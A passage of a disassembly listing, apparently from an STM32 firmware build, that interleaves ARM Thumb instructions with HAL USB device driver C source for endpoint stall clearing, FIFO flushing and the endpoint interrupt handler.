 80023f4:	687b      	ldr	r3, [r7, #4]
 80023f6:	681a      	ldr	r2, [r3, #0]
 80023f8:	687b      	ldr	r3, [r7, #4]
 80023fa:	f503 732c 	add.w	r3, r3, #688	; 0x2b0
 80023fe:	4619      	mov	r1, r3
 8002400:	4610      	mov	r0, r2
 8002402:	f005 fffc 	bl	80083fe <USB_EP0_OutStart>
  }

  __HAL_UNLOCK(hpcd);
 8002406:	687b      	ldr	r3, [r7, #4]
 8002408:	2200      	movs	r2, #0
 800240a:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 800240e:	2300      	movs	r3, #0
}
 8002410:	4618      	mov	r0, r3
 8002412:	3710      	adds	r7, #16
 8002414:	46bd      	mov	sp, r7
 8002416:	bd80      	pop	{r7, pc}

08002418 <HAL_PCD_EP_ClrStall>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_ClrStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 8002418:	b580      	push	{r7, lr}
 800241a:	b084      	sub	sp, #16
 800241c:	af00      	add	r7, sp, #0
 800241e:	6078      	str	r0, [r7, #4]
 8002420:	460b      	mov	r3, r1
 8002422:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if (((uint32_t)ep_addr & 0x0FU) > hpcd->Init.dev_endpoints)
 8002424:	78fb      	ldrb	r3, [r7, #3]
 8002426:	f003 020f 	and.w	r2, r3, #15
 800242a:	687b      	ldr	r3, [r7, #4]
 800242c:	685b      	ldr	r3, [r3, #4]
 800242e:	429a      	cmp	r2, r3
 8002430:	d901      	bls.n	8002436 <HAL_PCD_EP_ClrStall+0x1e>
  {
    return HAL_ERROR;
 8002432:	2301      	movs	r3, #1
 8002434:	e040      	b.n	80024b8 <HAL_PCD_EP_ClrStall+0xa0>
  }

  if ((0x80U & ep_addr) == 0x80U)
 8002436:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800243a:	2b00      	cmp	r3, #0
 800243c:	da0e      	bge.n	800245c <HAL_PCD_EP_ClrStall+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 800243e:	78fb      	ldrb	r3, [r7, #3]
 8002440:	f003 0307 	and.w	r3, r3, #7
 8002444:	1c5a      	adds	r2, r3, #1
 8002446:	4613      	mov	r3, r2
 8002448:	009b      	lsls	r3, r3, #2
 800244a:	4413      	add	r3, r2
 800244c:	00db      	lsls	r3, r3, #3
 800244e:	687a      	ldr	r2, [r7, #4]
 8002450:	4413      	add	r3, r2
 8002452:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 8002454:	68fb      	ldr	r3, [r7, #12]
 8002456:	2201      	movs	r2, #1
 8002458:	705a      	strb	r2, [r3, #1]
 800245a:	e00e      	b.n	800247a <HAL_PCD_EP_ClrStall+0x62>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 800245c:	78fb      	ldrb	r3, [r7, #3]
 800245e:	f003 0207 	and.w	r2, r3, #7
 8002462:	4613      	mov	r3, r2
 8002464:	009b      	lsls	r3, r3, #2
 8002466:	4413      	add	r3, r2
 8002468:	00db      	lsls	r3, r3, #3
 800246a:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 800246e:	687a      	ldr	r2, [r7, #4]
 8002470:	4413      	add	r3, r2
 8002472:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 8002474:	68fb      	ldr	r3, [r7, #12]
 8002476:	2200      	movs	r2, #0
 8002478:	705a      	strb	r2, [r3, #1]
  }

  ep->is_stall = 0U;
 800247a:	68fb      	ldr	r3, [r7, #12]
 800247c:	2200      	movs	r2, #0
 800247e:	709a      	strb	r2, [r3, #2]
  ep->num = ep_addr & EP_ADDR_MSK;
 8002480:	78fb      	ldrb	r3, [r7, #3]
 8002482:	f003 0307 	and.w	r3, r3, #7
 8002486:	b2da      	uxtb	r2, r3
 8002488:	68fb      	ldr	r3, [r7, #12]
 800248a:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 800248c:	687b      	ldr	r3, [r7, #4]
 800248e:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002492:	2b01      	cmp	r3, #1
 8002494:	d101      	bne.n	800249a <HAL_PCD_EP_ClrStall+0x82>
 8002496:	2302      	movs	r3, #2
 8002498:	e00e      	b.n	80024b8 <HAL_PCD_EP_ClrStall+0xa0>
 800249a:	687b      	ldr	r3, [r7, #4]
 800249c:	2201      	movs	r2, #1
 800249e:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_EPClearStall(hpcd->Instance, ep);
 80024a2:	687b      	ldr	r3, [r7, #4]
 80024a4:	681b      	ldr	r3, [r3, #0]
 80024a6:	68f9      	ldr	r1, [r7, #12]
 80024a8:	4618      	mov	r0, r3
 80024aa:	f005 feaa 	bl	8008202 <USB_EPClearStall>
  __HAL_UNLOCK(hpcd);
 80024ae:	687b      	ldr	r3, [r7, #4]
 80024b0:	2200      	movs	r2, #0
 80024b2:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 80024b6:	2300      	movs	r3, #0
}
 80024b8:	4618      	mov	r0, r3
 80024ba:	3710      	adds	r7, #16
 80024bc:	46bd      	mov	sp, r7
 80024be:	bd80      	pop	{r7, pc}

080024c0 <HAL_PCD_EP_Flush>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Flush(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 80024c0:	b580      	push	{r7, lr}
 80024c2:	b082      	sub	sp, #8
 80024c4:	af00      	add	r7, sp, #0
 80024c6:	6078      	str	r0, [r7, #4]
 80024c8:	460b      	mov	r3, r1
 80024ca:	70fb      	strb	r3, [r7, #3]
  __HAL_LOCK(hpcd);
 80024cc:	687b      	ldr	r3, [r7, #4]
 80024ce:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80024d2:	2b01      	cmp	r3, #1
 80024d4:	d101      	bne.n	80024da <HAL_PCD_EP_Flush+0x1a>
 80024d6:	2302      	movs	r3, #2
 80024d8:	e01b      	b.n	8002512 <HAL_PCD_EP_Flush+0x52>
 80024da:	687b      	ldr	r3, [r7, #4]
 80024dc:	2201      	movs	r2, #1
 80024de:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  if ((ep_addr & 0x80U) == 0x80U)
 80024e2:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80024e6:	2b00      	cmp	r3, #0
 80024e8:	da09      	bge.n	80024fe <HAL_PCD_EP_Flush+0x3e>
  {
    (void)USB_FlushTxFifo(hpcd->Instance, (uint32_t)ep_addr & EP_ADDR_MSK);
 80024ea:	687b      	ldr	r3, [r7, #4]
 80024ec:	681a      	ldr	r2, [r3, #0]
 80024ee:	78fb      	ldrb	r3, [r7, #3]
 80024f0:	f003 0307 	and.w	r3, r3, #7
 80024f4:	4619      	mov	r1, r3
 80024f6:	4610      	mov	r0, r2
 80024f8:	f003 fcb8 	bl	8005e6c <USB_FlushTxFifo>
 80024fc:	e004      	b.n	8002508 <HAL_PCD_EP_Flush+0x48>
  }
  else
  {
    (void)USB_FlushRxFifo(hpcd->Instance);
 80024fe:	687b      	ldr	r3, [r7, #4]
 8002500:	681b      	ldr	r3, [r3, #0]
 8002502:	4618      	mov	r0, r3
 8002504:	f003 fcbe 	bl	8005e84 <USB_FlushRxFifo>
  }

  __HAL_UNLOCK(hpcd);
 8002508:	687b      	ldr	r3, [r7, #4]
 800250a:	2200      	movs	r2, #0
 800250c:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 8002510:	2300      	movs	r3, #0
}
 8002512:	4618      	mov	r0, r3
 8002514:	3708      	adds	r7, #8
 8002516:	46bd      	mov	sp, r7
 8002518:	bd80      	pop	{r7, pc}

0800251a <PCD_EP_ISR_Handler>:
  * @brief  This function handles PCD Endpoint interrupt request.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
static HAL_StatusTypeDef PCD_EP_ISR_Handler(PCD_HandleTypeDef *hpcd)
{
 800251a:	b580      	push	{r7, lr}
 800251c:	b096      	sub	sp, #88	; 0x58
 800251e:	af00      	add	r7, sp, #0
 8002520:	6078      	str	r0, [r7, #4]
#if (USE_USB_DOUBLE_BUFFER != 1U)
  count = 0U;
#endif /* USE_USB_DOUBLE_BUFFER */

  /* stay in loop while pending interrupts */
  while ((hpcd->Instance->ISTR & USB_ISTR_CTR) != 0U)
 8002522:	e3b1      	b.n	8002c88 <PCD_EP_ISR_Handler+0x76e>
  {
    wIstr = hpcd->Instance->ISTR;
 8002524:	687b      	ldr	r3, [r7, #4]
 8002526:	681b      	ldr	r3, [r3, #0]
 8002528:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 800252c:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e

    /* extract highest priority endpoint number */
    epindex = (uint8_t)(wIstr & USB_ISTR_EP_ID);
 8002530:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 8002534:	b2db      	uxtb	r3, r3
 8002536:	f003 030f 	and.w	r3, r3, #15
 800253a:	f887 304d 	strb.w	r3, [r7, #77]	; 0x4d

    if (epindex == 0U)
 800253e:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002542:	2b00      	cmp	r3, #0
 8002544:	f040 8173 	bne.w	800282e <PCD_EP_ISR_Handler+0x314>
    {
      /* Decode and service control endpoint interrupt */

      /* DIR bit = origin of the interrupt */
      if ((wIstr & USB_ISTR_DIR) == 0U)
 8002548:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 800254c:	f003 0310 	and.w	r3, r3, #16
 8002550:	2b00      	cmp	r3, #0
 8002552:	d150      	bne.n	80025f6 <PCD_EP_ISR_Handler+0xdc>
      {
        /* DIR = 0 */

        /* DIR = 0 => IN  int */
        /* DIR = 0 implies that (EP_CTR_TX = 1) always */
        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 8002554:	687b      	ldr	r3, [r7, #4]
 8002556:	681b      	ldr	r3, [r3, #0]
 8002558:	881b      	ldrh	r3, [r3, #0]
 800255a:	b29b      	uxth	r3, r3
 800255c:	f423 43e1 	bic.w	r3, r3, #28800	; 0x7080
 8002560:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002564:	81fb      	strh	r3, [r7, #14]
 8002566:	687b      	ldr	r3, [r7, #4]
 8002568:	681a      	ldr	r2, [r3, #0]
 800256a:	89fb      	ldrh	r3, [r7, #14]
 800256c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002570:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002574:	b29b      	uxth	r3, r3
 8002576:	8013      	strh	r3, [r2, #0]
        ep = &hpcd->IN_ep[0];
 8002578:	687b      	ldr	r3, [r7, #4]
 800257a:	3328      	adds	r3, #40	; 0x28
 800257c:	657b      	str	r3, [r7, #84]	; 0x54

        ep->xfer_count = PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);
 800257e:	687b      	ldr	r3, [r7, #4]
 8002580:	681b      	ldr	r3, [r3, #0]
 8002582:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002586:	b29b      	uxth	r3, r3
 8002588:	461a      	mov	r2, r3
 800258a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800258c:	781b      	ldrb	r3, [r3, #0]
 800258e:	00db      	lsls	r3, r3, #3
 8002590:	4413      	add	r3, r2
 8002592:	687a      	ldr	r2, [r7, #4]
 8002594:	6812      	ldr	r2, [r2, #0]
 8002596:	4413      	add	r3, r2
 8002598:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800259c:	881b      	ldrh	r3, [r3, #0]
 800259e:	f3c3 0209 	ubfx	r2, r3, #0, #10
 80025a2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025a4:	61da      	str	r2, [r3, #28]
        ep->xfer_buff += ep->xfer_count;
 80025a6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025a8:	695a      	ldr	r2, [r3, #20]
 80025aa:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025ac:	69db      	ldr	r3, [r3, #28]
 80025ae:	441a      	add	r2, r3
 80025b0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025b2:	615a      	str	r2, [r3, #20]

        /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
        hpcd->DataInStageCallback(hpcd, 0U);
#else
        HAL_PCD_DataInStageCallback(hpcd, 0U);
 80025b4:	2100      	movs	r1, #0
 80025b6:	6878      	ldr	r0, [r7, #4]
 80025b8:	f00a f98f 	bl	800c8da <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

        if ((hpcd->USB_Address > 0U) && (ep->xfer_len == 0U))
 80025bc:	687b      	ldr	r3, [r7, #4]
 80025be:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 80025c2:	b2db      	uxtb	r3, r3
 80025c4:	2b00      	cmp	r3, #0
 80025c6:	f000 835f 	beq.w	8002c88 <PCD_EP_ISR_Handler+0x76e>
 80025ca:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025cc:	699b      	ldr	r3, [r3, #24]
 80025ce:	2b00      	cmp	r3, #0
 80025d0:	f040 835a 	bne.w	8002c88 <PCD_EP_ISR_Handler+0x76e>
        {
          hpcd->Instance->DADDR = ((uint16_t)hpcd->USB_Address | USB_DADDR_EF);
 80025d4:	687b      	ldr	r3, [r7, #4]
 80025d6:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 80025da:	b2db      	uxtb	r3, r3
 80025dc:	f063 037f 	orn	r3, r3, #127	; 0x7f
 80025e0:	b2da      	uxtb	r2, r3
 80025e2:	687b      	ldr	r3, [r7, #4]
 80025e4:	681b      	ldr	r3, [r3, #0]
 80025e6:	b292      	uxth	r2, r2
 80025e8:	f8a3 204c 	strh.w	r2, [r3, #76]	; 0x4c
          hpcd->USB_Address = 0U;
 80025ec:	687b      	ldr	r3, [r7, #4]
 80025ee:	2200      	movs	r2, #0
 80025f0:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 80025f4:	e348      	b.n	8002c88 <PCD_EP_ISR_Handler+0x76e>
      {
        /* DIR = 1 */

        /* DIR = 1 & CTR_RX => SETUP or OUT int */
        /* DIR = 1 & (CTR_TX | CTR_RX) => 2 int pending */
        ep = &hpcd->OUT_ep[0];
 80025f6:	687b      	ldr	r3, [r7, #4]
 80025f8:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80025fc:	657b      	str	r3, [r7, #84]	; 0x54
        wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, PCD_ENDP0);
 80025fe:	687b      	ldr	r3, [r7, #4]
 8002600:	681b      	ldr	r3, [r3, #0]
 8002602:	881b      	ldrh	r3, [r3, #0]
 8002604:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

        if ((wEPVal & USB_EP_SETUP) != 0U)
 8002608:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 800260c:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8002610:	2b00      	cmp	r3, #0
 8002612:	d032      	beq.n	800267a <PCD_EP_ISR_Handler+0x160>
        {
          /* Get SETUP Packet */
          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 8002614:	687b      	ldr	r3, [r7, #4]
 8002616:	681b      	ldr	r3, [r3, #0]
 8002618:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800261c:	b29b      	uxth	r3, r3
 800261e:	461a      	mov	r2, r3
 8002620:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002622:	781b      	ldrb	r3, [r3, #0]
 8002624:	00db      	lsls	r3, r3, #3
 8002626:	4413      	add	r3, r2
 8002628:	687a      	ldr	r2, [r7, #4]
 800262a:	6812      	ldr	r2, [r2, #0]
 800262c:	4413      	add	r3, r2
 800262e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002632:	881b      	ldrh	r3, [r3, #0]
 8002634:	f3c3 0209 	ubfx	r2, r3, #0, #10
 8002638:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800263a:	61da      	str	r2, [r3, #28]

          USB_ReadPMA(hpcd->Instance, (uint8_t *)hpcd->Setup,
 800263c:	687b      	ldr	r3, [r7, #4]
 800263e:	6818      	ldr	r0, [r3, #0]
 8002640:	687b      	ldr	r3, [r7, #4]
 8002642:	f503 712c 	add.w	r1, r3, #688	; 0x2b0
 8002646:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002648:	88da      	ldrh	r2, [r3, #6]
                      ep->pmaadress, (uint16_t)ep->xfer_count);
 800264a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800264c:	69db      	ldr	r3, [r3, #28]
          USB_ReadPMA(hpcd->Instance, (uint8_t *)hpcd->Setup,
 800264e:	b29b      	uxth	r3, r3
 8002650:	f005 ff23 	bl	800849a <USB_ReadPMA>

          /* SETUP bit kept frozen while CTR_RX = 1 */
          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 8002654:	687b      	ldr	r3, [r7, #4]
 8002656:	681b      	ldr	r3, [r3, #0]
 8002658:	881b      	ldrh	r3, [r3, #0]
 800265a:	b29a      	uxth	r2, r3
 800265c:	f640 738f 	movw	r3, #3983	; 0xf8f
 8002660:	4013      	ands	r3, r2
 8002662:	823b      	strh	r3, [r7, #16]
 8002664:	687b      	ldr	r3, [r7, #4]
 8002666:	681b      	ldr	r3, [r3, #0]
 8002668:	8a3a      	ldrh	r2, [r7, #16]
 800266a:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 800266e:	b292      	uxth	r2, r2
 8002670:	801a      	strh	r2, [r3, #0]

          /* Process SETUP Packet*/
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->SetupStageCallback(hpcd);
#else
          HAL_PCD_SetupStageCallback(hpcd);
 8002672:	6878      	ldr	r0, [r7, #4]
 8002674:	f00a f904 	bl	800c880 <HAL_PCD_SetupStageCallback>
 8002678:	e306      	b.n	8002c88 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else if ((wEPVal & USB_EP_CTR_RX) != 0U)
 800267a:	f9b7 304a 	ldrsh.w	r3, [r7, #74]	; 0x4a
 800267e:	2b00      	cmp	r3, #0
 8002680:	f280 8302 	bge.w	8002c88 <PCD_EP_ISR_Handler+0x76e>
        {
          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 8002684:	687b      	ldr	r3, [r7, #4]
 8002686:	681b      	ldr	r3, [r3, #0]
 8002688:	881b      	ldrh	r3, [r3, #0]
 800268a:	b29a      	uxth	r2, r3
 800268c:	f640 738f 	movw	r3, #3983	; 0xf8f
 8002690:	4013      	ands	r3, r2
 8002692:	83fb      	strh	r3, [r7, #30]
 8002694:	687b      	ldr	r3, [r7, #4]
 8002696:	681b      	ldr	r3, [r3, #0]
 8002698:	8bfa      	ldrh	r2, [r7, #30]
 800269a:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 800269e:	b292      	uxth	r2, r2
 80026a0:	801a      	strh	r2, [r3, #0]

          /* Get Control Data OUT Packet */
          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 80026a2:	687b      	ldr	r3, [r7, #4]
 80026a4:	681b      	ldr	r3, [r3, #0]
 80026a6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80026aa:	b29b      	uxth	r3, r3
 80026ac:	461a      	mov	r2, r3
 80026ae:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026b0:	781b      	ldrb	r3, [r3, #0]
 80026b2:	00db      	lsls	r3, r3, #3
 80026b4:	4413      	add	r3, r2
 80026b6:	687a      	ldr	r2, [r7, #4]
 80026b8:	6812      	ldr	r2, [r2, #0]
 80026ba:	4413      	add	r3, r2
 80026bc:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80026c0:	881b      	ldrh	r3, [r3, #0]
 80026c2:	f3c3 0209 	ubfx	r2, r3, #0, #10
 80026c6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026c8:	61da      	str	r2, [r3, #28]

          if ((ep->xfer_count != 0U) && (ep->xfer_buff != 0U))
 80026ca:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026cc:	69db      	ldr	r3, [r3, #28]
 80026ce:	2b00      	cmp	r3, #0
 80026d0:	d019      	beq.n	8002706 <PCD_EP_ISR_Handler+0x1ec>
 80026d2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026d4:	695b      	ldr	r3, [r3, #20]
 80026d6:	2b00      	cmp	r3, #0
 80026d8:	d015      	beq.n	8002706 <PCD_EP_ISR_Handler+0x1ec>
          {
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff,
 80026da:	687b      	ldr	r3, [r7, #4]
 80026dc:	6818      	ldr	r0, [r3, #0]
 80026de:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026e0:	6959      	ldr	r1, [r3, #20]
 80026e2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026e4:	88da      	ldrh	r2, [r3, #6]
                        ep->pmaadress, (uint16_t)ep->xfer_count);
 80026e6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026e8:	69db      	ldr	r3, [r3, #28]
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff,
 80026ea:	b29b      	uxth	r3, r3
 80026ec:	f005 fed5 	bl	800849a <USB_ReadPMA>

            ep->xfer_buff += ep->xfer_count;
 80026f0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026f2:	695a      	ldr	r2, [r3, #20]
 80026f4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026f6:	69db      	ldr	r3, [r3, #28]
 80026f8:	441a      	add	r2, r3
 80026fa:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026fc:	615a      	str	r2, [r3, #20]

            /* Process Control Data OUT Packet */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
            hpcd->DataOutStageCallback(hpcd, 0U);
#else
            HAL_PCD_DataOutStageCallback(hpcd, 0U);
 80026fe:	2100      	movs	r1, #0
 8002700:	6878      	ldr	r0, [r7, #4]
 8002702:	f00a f8cf 	bl	800c8a4 <HAL_PCD_DataOutStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
          }

          wEPVal = (uint16_t)PCD_GET_ENDPOINT(hpcd->Instance, PCD_ENDP0);
 8002706:	687b      	ldr	r3, [r7, #4]
 8002708:	681b      	ldr	r3, [r3, #0]
 800270a:	881b      	ldrh	r3, [r3, #0]
 800270c:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

          if (((wEPVal & USB_EP_SETUP) == 0U) && ((wEPVal & USB_EP_RX_STRX) != USB_EP_RX_VALID))
 8002710:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002714:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8002718:	2b00      	cmp	r3, #0
 800271a:	f040 82b5 	bne.w	8002c88 <PCD_EP_ISR_Handler+0x76e>
 800271e:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002722:	f403 5340 	and.w	r3, r3, #12288	; 0x3000
 8002726:	f5b3 5f40 	cmp.w	r3, #12288	; 0x3000
 800272a:	f000 82ad 	beq.w	8002c88 <PCD_EP_ISR_Handler+0x76e>
          {
            PCD_SET_EP_RX_CNT(hpcd->Instance, PCD_ENDP0, ep->maxpacket);
 800272e:	687b      	ldr	r3, [r7, #4]
 8002730:	681b      	ldr	r3, [r3, #0]
 8002732:	61bb      	str	r3, [r7, #24]
 8002734:	687b      	ldr	r3, [r7, #4]
 8002736:	681b      	ldr	r3, [r3, #0]
 8002738:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800273c:	b29b      	uxth	r3, r3
 800273e:	461a      	mov	r2, r3
 8002740:	69bb      	ldr	r3, [r7, #24]
 8002742:	4413      	add	r3, r2
 8002744:	61bb      	str	r3, [r7, #24]
 8002746:	69bb      	ldr	r3, [r7, #24]
 8002748:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800274c:	617b      	str	r3, [r7, #20]
 800274e:	697b      	ldr	r3, [r7, #20]
 8002750:	881b      	ldrh	r3, [r3, #0]
 8002752:	b29b      	uxth	r3, r3
 8002754:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002758:	b29a      	uxth	r2, r3
 800275a:	697b      	ldr	r3, [r7, #20]
 800275c:	801a      	strh	r2, [r3, #0]
 800275e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002760:	691b      	ldr	r3, [r3, #16]
 8002762:	2b3e      	cmp	r3, #62	; 0x3e
 8002764:	d91d      	bls.n	80027a2 <PCD_EP_ISR_Handler+0x288>
 8002766:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002768:	691b      	ldr	r3, [r3, #16]
 800276a:	095b      	lsrs	r3, r3, #5
 800276c:	647b      	str	r3, [r7, #68]	; 0x44
 800276e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002770:	691b      	ldr	r3, [r3, #16]
 8002772:	f003 031f 	and.w	r3, r3, #31
 8002776:	2b00      	cmp	r3, #0
 8002778:	d102      	bne.n	8002780 <PCD_EP_ISR_Handler+0x266>
 800277a:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800277c:	3b01      	subs	r3, #1
 800277e:	647b      	str	r3, [r7, #68]	; 0x44
 8002780:	697b      	ldr	r3, [r7, #20]
 8002782:	881b      	ldrh	r3, [r3, #0]
 8002784:	b29a      	uxth	r2, r3
 8002786:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8002788:	b29b      	uxth	r3, r3
 800278a:	029b      	lsls	r3, r3, #10
 800278c:	b29b      	uxth	r3, r3
 800278e:	4313      	orrs	r3, r2
 8002790:	b29b      	uxth	r3, r3
 8002792:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002796:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800279a:	b29a      	uxth	r2, r3
 800279c:	697b      	ldr	r3, [r7, #20]
 800279e:	801a      	strh	r2, [r3, #0]
 80027a0:	e026      	b.n	80027f0 <PCD_EP_ISR_Handler+0x2d6>
 80027a2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027a4:	691b      	ldr	r3, [r3, #16]
 80027a6:	2b00      	cmp	r3, #0
 80027a8:	d10a      	bne.n	80027c0 <PCD_EP_ISR_Handler+0x2a6>
 80027aa:	697b      	ldr	r3, [r7, #20]
 80027ac:	881b      	ldrh	r3, [r3, #0]
 80027ae:	b29b      	uxth	r3, r3
 80027b0:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80027b4:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80027b8:	b29a      	uxth	r2, r3
 80027ba:	697b      	ldr	r3, [r7, #20]
 80027bc:	801a      	strh	r2, [r3, #0]
 80027be:	e017      	b.n	80027f0 <PCD_EP_ISR_Handler+0x2d6>
 80027c0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027c2:	691b      	ldr	r3, [r3, #16]
 80027c4:	085b      	lsrs	r3, r3, #1
 80027c6:	647b      	str	r3, [r7, #68]	; 0x44
 80027c8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027ca:	691b      	ldr	r3, [r3, #16]
 80027cc:	f003 0301 	and.w	r3, r3, #1
 80027d0:	2b00      	cmp	r3, #0
 80027d2:	d002      	beq.n	80027da <PCD_EP_ISR_Handler+0x2c0>
 80027d4:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80027d6:	3301      	adds	r3, #1
 80027d8:	647b      	str	r3, [r7, #68]	; 0x44
 80027da:	697b      	ldr	r3, [r7, #20]
 80027dc:	881b      	ldrh	r3, [r3, #0]
 80027de:	b29a      	uxth	r2, r3
 80027e0:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80027e2:	b29b      	uxth	r3, r3
 80027e4:	029b      	lsls	r3, r3, #10
 80027e6:	b29b      	uxth	r3, r3
 80027e8:	4313      	orrs	r3, r2
 80027ea:	b29a      	uxth	r2, r3
 80027ec:	697b      	ldr	r3, [r7, #20]
 80027ee:	801a      	strh	r2, [r3, #0]
            PCD_SET_EP_RX_STATUS(hpcd->Instance, PCD_ENDP0, USB_EP_RX_VALID);
 80027f0:	687b      	ldr	r3, [r7, #4]
 80027f2:	681b      	ldr	r3, [r3, #0]
 80027f4:	881b      	ldrh	r3, [r3, #0]
 80027f6:	b29b      	uxth	r3, r3
 80027f8:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80027fc:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002800:	827b      	strh	r3, [r7, #18]
 8002802:	8a7b      	ldrh	r3, [r7, #18]
 8002804:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8002808:	827b      	strh	r3, [r7, #18]
 800280a:	8a7b      	ldrh	r3, [r7, #18]
 800280c:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002810:	827b      	strh	r3, [r7, #18]
 8002812:	687b      	ldr	r3, [r7, #4]
 8002814:	681a      	ldr	r2, [r3, #0]
 8002816:	8a7b      	ldrh	r3, [r7, #18]
 8002818:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
